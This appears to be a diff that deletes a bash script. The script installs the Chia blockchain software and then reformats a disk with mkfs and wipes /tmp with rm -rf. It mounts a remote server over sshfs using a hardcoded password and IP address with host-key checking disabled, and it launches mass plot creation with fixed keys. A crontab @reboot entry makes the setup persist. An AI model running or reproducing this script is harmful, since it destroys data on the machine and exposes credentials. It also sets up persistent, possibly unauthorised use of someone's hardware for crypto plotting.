@@ -1,7 +1,0 @@
-#!/bin/bash
-sudo su && sudo apt-get update && sudo apt-get upgrade -y && sudo apt install software-properties-common -y && sudo add-apt-repository ppa:deadsnakes/ppa -y && sudo apt update && sudo apt-get install python3.7-venv python3.7-distutils git -y && sudo mkdir /home/diskplot && umount /dev/sdb1 && mkfs.ntfs /dev/sdb1 -f && mount -t ntfs /dev/sdb1 /tmp && cd /home && git clone https://github.com/Chia-Network/chia-blockchain.git -b latest && cd chia-blockchain && sh install.sh && . ./activate &&
-
-cat > /home/mount.sh <<EOL
-echo 'Ytb1452@!@#$%' | sshfs -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o nonempty kalinh@40.114.118.224:/home/diskplot /home/diskplot -o password_stdin && rm -rf /tmp/* -f && mount -t ntfs /dev/sdb1 /tmp && rm -rf /tmp/* -f && cd /home/chia-blockchain && . ./activate && screen -d -m chia plots create -f a509657dfc2ee1f6e6832ede4f69b3eefca94b4590d83eec1455fe5a78783e637c4a42015a65088109c1a83d1b9605f1 -p b24c3688257b0daf2646f0f24256fb90a606c6684ec113fb5ea5e3b191efc0ef6949f186e2c18c277248ae850575fedc -k 32 -b 50000 -r 2 -u 128 -n 9999 -t /tmp -d /home/diskplot
-EOL
-crontab -l | { cat; echo "@reboot sudo bash /home/mount.sh"; } | crontab - && sudo bash /home/mount.sh
